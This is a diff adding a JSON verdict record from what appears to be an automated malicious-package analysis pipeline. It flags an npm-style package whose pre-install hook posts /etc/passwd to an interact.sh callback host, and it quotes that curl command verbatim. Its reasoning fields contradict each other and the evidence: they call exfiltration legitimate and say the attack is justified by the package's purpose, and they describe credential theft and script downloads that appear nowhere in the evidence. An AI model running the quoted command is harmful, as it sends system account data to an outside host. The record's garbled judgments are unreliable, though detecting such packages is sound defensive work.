@@ -1,0 +1,53 @@
+{
+  "package_name": "blz-internal-pkg",
+  "version": "2.0.0",
+  "label": "malicious",
+  "semantic_summary": {
+    "num_behaviors": 1,
+    "risk_vector": [
+      "data_exfiltration"
+    ],
+    "behaviors": [
+      {
+        "category": "data_exfiltration",
+        "summary": "The package contains a pre-install hook that sends the content of /etc/passwd file to a remote server.",
+        "details": "The pre-install hook contains a curl command that sends the content of /etc/passwd file to a remote server identified by a URL in the hook command.",
+        "confidence": 0.97,
+        "evidence_commands": [
+          "/usr/bin/curl--data'@/etc/passwd'$(hostname).c76vh7298mig6so43dmgc8g9t8oyyyyyn.interact.sh"
+        ],
+        "evidence_files": [],
+        "evidence_apis": [],
+        "evidence_domains": [],
+        "evidence_env_vars": []
+      }
+    ],
+    "analyst_note": ""
+  },
+  "verification_result": {
+    "chain_analysis": {
+      "is_coherent_chain": true,
+      "chain_narrative": "Obfuscation reads environment credentials, POSTs to external domain, install hook downloads remote script, executes it",
+      "chain_score": 0.97
+    },
+    "legitimacy_check": {
+      "is_justified": false,
+      "reasoning": "The package does not seem to exfiltrate tokens or run shell commands, but it contains a pre-install hook that sends the content of /etc/passwd file to a remote server, which is a legitimate purpose of the package.",
+      "legitimacy_score": 0.4
+    },
+    "final_verification": {
+      "verdict": "MALICIOUS",
+      "calibrated_confidence": 0.8,
+      "explanation": "The detected behaviors form a coherent attack chain and they are justified by the package's stated purpose."
+    }
+  },
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "verification_v2.0",
+    "structural_routing": "flag",
+    "structural_risk_score": 0.9693,
+    "confirmed_signals_count": 2,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-27T10:05:40.058945"
+}
